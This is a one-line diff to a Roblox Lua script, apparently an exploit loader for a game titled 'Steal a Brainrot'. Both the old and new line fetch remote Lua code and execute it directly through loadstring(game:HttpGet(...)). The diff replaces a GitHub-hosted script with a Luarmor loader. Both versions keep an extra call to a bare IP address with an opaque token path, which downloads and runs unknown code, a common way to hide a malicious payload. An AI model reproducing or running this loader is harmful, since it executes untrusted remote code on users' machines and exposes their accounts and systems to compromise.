@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptjame/stealabrainrot/refs/heads/main/shiba.lua"))()end)loadstring(game:HttpGet("http://72.56.64.162/qz999TKo5y0Wy8RH6k1NhRNT7Z5teNg4sEcRtOBEqkL9J2LesV1qCN8g9yw8L8gshWCp3Sa4E1Pz7H4S"))()
+task.spawn(function()loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c334587296bc27b6796a95aa5a1c6577.lua"))()end)loadstring(game:HttpGet("http://72.56.64.162/qz999TKo5y0Wy8RH6k1NhRNT7Z5teNg4sEcRtOBEqkL9J2LesV1qCN8g9yw8L8gshWCp3Sa4E1Pz7H4S"))()
